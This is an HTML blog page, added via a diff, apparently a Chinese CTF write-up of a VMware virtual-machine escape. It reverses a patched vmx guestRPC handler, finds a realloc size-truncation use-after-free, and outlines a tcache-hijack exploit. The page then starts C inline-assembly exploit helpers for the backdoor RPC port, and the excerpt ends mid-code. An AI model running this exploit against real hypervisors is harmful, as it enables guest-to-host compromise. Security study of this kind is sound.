@@ -1,0 +1,1182 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
+  <link rel="icon" href="/img/head.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Epiphany">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="本文首发于奇安信攻防社区:https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1678  0x00 前言初次分析虚拟机逃逸，之前分析了一篇rwctf2018，这次视线转到强网杯的一个虚拟机逃逸分析。难度比rw大一点点，但是逆向分析还是重点，所以也不会差到哪里去。 一些有关基础的链接放在这里，不做赘述。 题解 RPC&#x2F;backdoor机制 0x01 分析bindiff这类题目都">
+<meta property="og:type" content="article">
+<meta property="og:title" content="虚拟机逃逸（二）">
+<meta property="og:url" content="http://example.com/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
+<meta property="og:site_name" content="Epiphany&#39;s blog">
+<meta property="og:description" content="本文首发于奇安信攻防社区:https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1678  0x00 前言初次分析虚拟机逃逸，之前分析了一篇rwctf2018，这次视线转到强网杯的一个虚拟机逃逸分析。难度比rw大一点点，但是逆向分析还是重点，所以也不会差到哪里去。 一些有关基础的链接放在这里，不做赘述。 题解 RPC&#x2F;backdoor机制 0x01 分析bindiff这类题目都">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b49b8f237dd3d59e57968a503942f5b52a884c87.png">
+<meta property="article:published_time" content="2022-06-21T16:43:07.000Z">
+<meta property="article:modified_time" content="2022-06-21T17:01:27.889Z">
+<meta property="article:author" content="Epiphany">
+<meta property="article:tag" content="realworld">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b49b8f237dd3d59e57968a503942f5b52a884c87.png">
+  
+  
+  
+  <title>虚拟机逃逸（二） - Epiphany&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/prism/1.27.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/test.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"😊","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Epiphany&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/categories/CTF">
+                    
+                    CTF
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/categories/CVE">
+                    
+                    CVE
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/categories/chats">
+                    
+                    chats
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b49b8f237dd3d59e57968a503942f5b52a884c87.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="虚拟机逃逸（二）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-22 00:43" pubdate>
+          星期三, 六月 22日 2022, 12:43 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          15k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          124 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">虚拟机逃逸（二）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>本文首发于奇安信攻防社区:<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1678">https://forum.butian.net/share/1678</a></p>
+</blockquote>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>初次分析虚拟机逃逸，之前分析了一篇rwctf2018，这次视线转到强网杯的一个虚拟机逃逸分析。难度比rw大一点点，但是逆向分析还是重点，所以也不会差到哪里去。</p>
+<p>一些有关基础的链接放在这里，不做赘述。</p>
+<p><a target="_blank" rel="noopener" href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">题解</a></p>
+<p><a target="_blank" rel="noopener" href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">RPC&#x2F;backdoor机制</a></p>
+<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><h3 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h3><p>这类题目都会给一个patched的vmx文件，安装vmware后，在<code>/usr/lib/vmware/bin</code>目录下可以找到目标vmx。使用bindiff比较patched和patch之前的区别可以迅速定位漏洞的位置。</p>
+<p>（bindiff分析太慢了，这次选择了010）</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-89eec2810b186d524efda555894cca9031ad35e7.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>有三处不同，ida定位到关键位置。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-18b396ee70885b34dc4b57846efde51baa0d1a1f.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>一处把r12d改成了r12w，相当于省略了r12的高位。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b9b1beba56c3803f31e032d2c8476ce9c7d9fda8.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>把跳转的条件改为了大于等于。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a25862dfd05d6be26c03539e4ccba81caefc64ab.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>跳转改为了无条件。</p>
+<p>最后一个改变，取消了条件检查，前两处patch改变如下。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-2c772477f3bc5dde104c35b1d042d567f8c8da28.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>本能的反应就是realloc函数的漏洞，这类题在常规pwn中很常见，realloc函数第二个size参数如果为0，则和free效果一样，常常会导致DF、UAF.接下来细看一下伪代码。</p>
+<h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>Vmx漏洞依然位于guestRPC的处理函数中，该函数中使用了一个大的switch处理不同的信息。接下来详细分析。（虚拟机逃逸（一）中只给了分析的结构体）</p>
+<p>关于一些基础知识可以看<a href="">虚拟机逃逸（一）</a></p>
+<h4 id="Open-RPC-channel"><a href="#Open-RPC-channel" class="headerlink" title="Open_RPC_channel"></a>Open_RPC_channel</h4><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f4c153972dee2b077f41122e57c31023c87979c.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>这是switch下最简单的一个分支了，打开信道，内容就是简单的接受数据包，然后获得magicnum（这部分是调试得到的）</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4ac942da8b78bba6ed812cf7878a8b0b70561da5.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>magicnum会进行一个比较如果失败就直接退出。</p>
+<h4 id="Send-RPC-command-length"><a href="#Send-RPC-command-length" class="headerlink" title="Send_RPC_command_length"></a>Send_RPC_command_length</h4><p>首先判断<code>byte_FE9584</code>，也是一个魔数，接着就判断长度。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3612cc7def195cc1c26ad8199975b01b1c452eb0.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>长度为-1或者大于0x10000就会报错。如果RPCI的长度符合就会继续往下走。!</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-38b67aa4103d4bfdb748b0cab800ba051690af6b.png" srcset="/img/loading.gif" lazyload alt="图片.png"><br> 在这个判断中，比较56和21偏移处的值，v56为接收到的数据包，v21为现有长度，如果数据长度大于现有长度则realloc重新分配，设置空间大小为新的大小，且修改msg_struct。</p>
+<p>漏洞就出在这个部分。漏洞存在的比较隐秘，大体属于整形溢出。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ac0faf0ad5f12e77c733f85edc1914098b407865.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>此处，处理size的时候加入了LOWORD修饰，导致dword-&gt;word高位失去，所以如果设置v56&#x3D;0xffff则可以通过大小判断，然后LOWORD(0xffff+1)&#x3D;LOWORD(0x10000)&#x3D;0，则此时的realloc第二个参数为0，运行时重新回收ptr。也没有清0.导致了ptr的UAF利用。</p>
+<h4 id="Send-RPC-command-data"><a href="#Send-RPC-command-data" class="headerlink" title="Send_RPC_command_data"></a>Send_RPC_command_data</h4><p>首先读入了需要发送的data指令，然后读取RPCI结构体，根据前面设置的长度，以不同的方式发送msg，一次最多发送四个字节，四个字节以内发送的方式都是一个byte一个byte的复制。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-36a2bba083009f75ce800f244312c2430730e108.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5ba2447ff1d948dcf05d645861baddbc9ae0718.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>发送完指令之后，判断是否发送完，如果发送完了则进入指令处理，根据一个类似虚表的bss段指针，执行某个函数rw2018中，最后就是劫持了这样一个函数，让我们成功逃逸。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-163cb20a6e28b6d9bce90892deae335522c69b65.png" srcset="/img/loading.gif" lazyload alt="图片.png"><br> 处理完之后，flag标志为设置为1.具体的指令可以搜索字符串，之前分析的rw2018中也有相应的分析，这里就不赘述。</p>
+<h4 id="Recieve-RPC-reply-length"><a href="#Recieve-RPC-reply-length" class="headerlink" title="Recieve_RPC_reply_length"></a>Recieve_RPC_reply_length</h4><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9589e548acbe430d797a4b712db305520f4cd8bd.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>guest获得，返回的长度，逻辑简单。</p>
+<h4 id="Recieve-RPC-reply-data"><a href="#Recieve-RPC-reply-data" class="headerlink" title="Recieve_RPC_reply_data"></a>Recieve_RPC_reply_data</h4><p>执行指令之后返回的数据。</p>
+<p>逻辑和发送差不多，同样的先收到长度，然后判断长度，一次接受四个字节，然后再把数据转移到缓冲区。最后设置flag为发送完毕。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5554b4d6edff9e2280409f6bd2c8cd2c86fea21f.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<h4 id="Finish-receiving-RPC-reply-amp-Close-RPC-channel"><a href="#Finish-receiving-RPC-reply-amp-Close-RPC-channel" class="headerlink" title="Finish_receiving_RPC_reply &amp; Close_RPC_channel"></a>Finish_receiving_RPC_reply &amp; Close_RPC_channel</h4><p>这两个部分也较为简单，前者在rw2018详细分析过，后者就是close channel。同时设置flag为1，整个指令处理发送接收流程结束。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面说过了，漏洞存在于realloc中，利用该UAF可以造成泄露等操作。实际上leak和利用的思路还是和rw差不多的。</p>
+<p>此处的UAF位置在realloc环节也就是设置发送长度的环节，但是造成UAF leak虚表还是需要先设置一个0x100大小的缓冲区。</p>
+<ul>
+<li>开启channel A channel B</li>
+<li>A设置buffer为0x100， B 使用info get也设置为0x100</li>
+<li>然后set_len触发A漏洞，B get这个buffer，A再次触发漏洞。此时B 的buffer已经在tcache里了</li>
+<li>调用dnd_vison函数写入虚表</li>
+<li>leak</li>
+</ul>
+<p>漏洞利用也是和rw一样，直接tcache劫持即可</p>
+<h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><p>主要的流程还是复制rw2018的，改动少部分即可。还是对师傅的脚本分析</p>
+<p>leak函数</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4b9fefc7745ee94ae07cccc09bfdcb91cf0fb928.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>完整的channel 0 发送指令</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6ac75d5867ddf6d2826a4909d4a23d798ecc4e9.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>channel发送部分info get</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a5dfc228eaf5bbe1046ff8828591417ae8e7d130.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>free channel 0 的buffer，然后在channel 1realloc出来。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf4ca0bca038198b936f068479e3d7c86b304719.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>再次free</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6101b8e1bf488c5b22fc638bf5ee6759f7e47d59.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>dnd_verison打入虚表</p>
+<p>tcache劫持操作也是一样的，只是改掉了触发的位置。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
+<span class="token keyword">void</span> <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>
+        <span class="token string">"movq %%rdi,%%r10\n\t"</span>
+        <span class="token string">"movq %%rsi,%%r11\n\t"</span>
+        <span class="token string">"movq %%rdx,%%r12\n\t"</span>
+        <span class="token string">"movq %%rcx,%%r13\n\t"</span>
+        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>
+        <span class="token string">"movl $0x49435052,%%ebx\n\t"</span>
+        <span class="token string">"movl $0x1e,%%ecx\n\t"</span>
+        <span class="token string">"movl $0x5658,%%edx\n\t"</span>
+        <span class="token string">"out %%eax,%%dx\n\t"</span>
+        <span class="token string">"movl %%edi,(%%r10)\n\t"</span>
+        <span class="token string">"movl %%esi,(%%r11)\n\t"</span>
+        <span class="token string">"movl %%edx,(%%r12)\n\t"</span>
+        <span class="token string">"movl %%ecx,(%%r13)\n\t"</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r8"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span><span class="token punctuation">,</span><span class="token string">"%r13"</span>
+       <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">channel_set_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>
+        <span class="token string">"movq %%r8,%%r10\n\t"</span>
+        <span class="token string">"movl %%ecx,%%ebx\n\t"</span>
+        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>
+        <span class="token string">"movl $0x0001001e,%%ecx\n\t"</span>
+        <span class="token string">"movw $0x5658,%%dx\n\t"</span>
+        <span class="token string">"out %%eax,%%dx\n\t"</span>
+        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>
+       <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">channel_send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>
+        <span class="token string">"movq %%r9,%%r10\n\t"</span>
+        <span class="token string">"movq %%r8,%%rbp\n\t"</span>
+        <span class="token string">"movq %%rcx,%%r11\n\t"</span>
+        <span class="token string">"movq $0,%%r12\n\t"</span>
+        <span class="token string">"1:\n\t"</span>
+        <span class="token string">"movq %%r8,%%rbp\n\t"</span>
+        <span class="token string">"add %%r12,%%rbp\n\t"</span>
+        <span class="token string">"movl (%%rbp),%%ebx\n\t"</span>
+        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>
+        <span class="token string">"movl $0x0002001e,%%ecx\n\t"</span>
+        <span class="token string">"movw $0x5658,%%dx\n\t"</span>
+        <span class="token string">"out %%eax,%%dx\n\t"</span>
+        <span class="token string">"addq $4,%%r12\n\t"</span>
+        <span class="token string">"cmpq %%r12,%%r11\n\t"</span>
+        <span class="token string">"ja 1b\n\t"</span>
+        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>
+        <span class="token string">"popq %%rbp\n\t"</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>
+        <span class="token string">"movq %%r8,%%r10\n\t"</span>
+        <span class="token string">"movq %%rcx,%%r11\n\t"</span>
+        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>
+        <span class="token string">"movl $0x0003001e,%%ecx\n\t"</span>
+        <span class="token string">"movw $0x5658,%%dx\n\t"</span>
+        <span class="token string">"out %%eax,%%dx\n\t"</span>
+        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>
+        <span class="token string">"movl %%ebx,(%%r11)\n\t"</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span>
+       <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">channel_recv_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>
+        <span class="token string">"movq %%r9,%%r10\n\t"</span>
+        <span class="token string">"movq %%r8,%%rbp\n\t"</span>
+        <span class="token string">"movq %%rcx,%%r11\n\t"</span>
+        <span class="token string">"movq $1,%%rbx\n\t"</span>
+        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>
+        <span class="token string">"movl $0x0004001e,%%ecx\n\t"</span>
+        <span class="token string">"movw $0x5658,%%dx\n\t"</span>
+        <span class="token string">"in %%dx,%%eax\n\t"</span>
+        <span class="token string">"add %%r11,%%rbp\n\t"</span>
+        <span class="token string">"movl %%ebx,(%%rbp)\n\t"</span>
+        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>
+        <span class="token string">"popq %%rbp\n\t"</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>
+       <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
